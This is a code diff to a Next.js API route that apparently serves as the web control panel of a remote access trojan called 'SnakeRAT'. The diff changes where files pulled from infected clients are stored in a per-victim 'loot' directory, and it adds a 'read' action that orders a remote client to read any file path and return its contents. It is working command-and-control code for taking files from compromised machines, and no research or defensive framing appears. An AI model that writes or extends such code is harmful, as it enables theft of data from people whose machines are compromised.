@@ -65,10 +65,10 @@ export async function GET(request: NextRequest) {
       const result = await sendAndWait(clientId, 'download', { path: filePath }, 60000)
       if (result.error) return NextResponse.json({ error: result.error }, { status: 400 })
 
-      // Find the loot file saved by s.py
-      const lootDir = path.join(process.cwd(), 'loot', 'file')
+      // Files are stored by SnakeRAT in: loot/<clientId>/file/<filename>
       const filename = result.filename || path.basename(filePath)
-      const lootPath = path.join(lootDir, filename)
+      const lootBase = path.resolve(process.cwd(), '..', 'loot')
+      const lootPath = path.join(lootBase, clientId, 'file', filename)
 
       if (fs.existsSync(lootPath)) {
         const buf = fs.readFileSync(lootPath)
@@ -138,6 +138,13 @@ export async function POST(request: NextRequest) {
       const result = await sendAndWait(clientId, 'write_file', { path: filePath, content }, 15000)
       if (result.error) return NextResponse.json({ error: result.error }, { status: 400 })
       return NextResponse.json({ success: true })
+    }
+
+    if (action === 'read') {
+      if (!filePath) return NextResponse.json({ error: 'path required' }, { status: 400 })
+      const result = await sendAndWait(clientId, 'read_file', { path: filePath }, 15000)
+      if (result.error) return NextResponse.json({ error: result.error }, { status: 400 })
+      return NextResponse.json({ success: true, content: result.content })
     }
 
     return NextResponse.json({ error: 'Unknown action' }, { status: 400 })
